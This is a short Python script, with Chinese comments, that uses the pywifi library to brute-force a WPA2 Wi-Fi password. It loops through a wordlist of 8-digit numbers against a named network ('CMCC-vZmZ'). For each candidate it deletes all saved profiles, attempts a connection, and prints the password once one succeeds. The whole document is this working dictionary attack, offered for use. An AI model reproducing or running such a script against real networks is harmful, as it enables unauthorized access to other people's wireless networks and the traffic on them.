from pywifi import *
import pywifi
import comtypes
import time

wifi=PyWiFi()
ifaces=wifi.interfaces()[0]

def testwifi(ifaces, ssidname, password):
    profile = pywifi.Profile()  # 创建wifi连接文件
    profile.ssid = ssidname  # 定义wifissid
    profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
    profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
    profile.key = password  # wifi密码
    ifaces.remove_all_network_profiles()  # 删除其他所有配置文件
    tmp_profile = ifaces.add_network_profile(profile)  # 加载配置文件
    ifaces.connect(tmp_profile)  # 连接wifi
    time.sleep(5)  # 5秒内能否连接上
    if ifaces.status() == const.IFACE_CONNECTED:
        print("True")
        return True
    else:
        print("False")
        return False
wifiname="CMCC-vZmZ"
files = open(r"password-8位数字.txt", 'r')
while True:
    password = files.readline()
    password = password.strip('\n')
    if not password:
        break
    if testwifi(ifaces, wifiname, password):
        print("Wifi账号:" + wifiname + "，Wifi密码:" + password)
        break
